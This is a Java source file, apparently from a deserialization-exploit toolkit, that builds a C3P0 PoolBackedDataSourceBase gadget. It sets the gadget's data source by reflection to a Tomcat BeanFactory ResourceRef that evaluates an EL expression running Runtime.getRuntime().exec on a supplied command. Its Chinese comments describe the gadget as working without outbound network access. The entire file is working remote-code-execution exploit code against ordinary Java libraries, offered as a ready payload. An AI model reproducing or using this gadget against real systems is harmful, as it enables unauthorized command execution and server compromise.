package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.Description;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.ObjectPayload;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


//适用不出网环境，需要tomcat8依赖
@Description("C3P0 EL表达式注入导致命令执行")
@DependenciesVersion("C3P0-0.9.5.2,tomcat-catalina-8.5.0,tomcat-embed-el-8.5.15")
@RequireParameter("Command")
public class C3P0ELInject implements ObjectPayload {

    public static   String command;

    @Override
    public  Object getObject(final UnSerInput unSerInput) throws Exception{
        C3P0ELInject.command = unSerInput.getCommand();
        EXP_Loader exp = new EXP_Loader();
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,exp);
        return poolBackedDataSourceBase;
    }

    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{
        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\""+C3P0ELInject.command +"\")"));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

//    public static byte[] getBytes(final String command) throws Exception {
//        Object ht = getObject(command);
//        ByteArrayOutputStream baous = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(baous);
//        oos.writeObject(ht);
//        byte[] bytes = baous.toByteArray();
//        oos.close();
//        return bytes;
//    }
}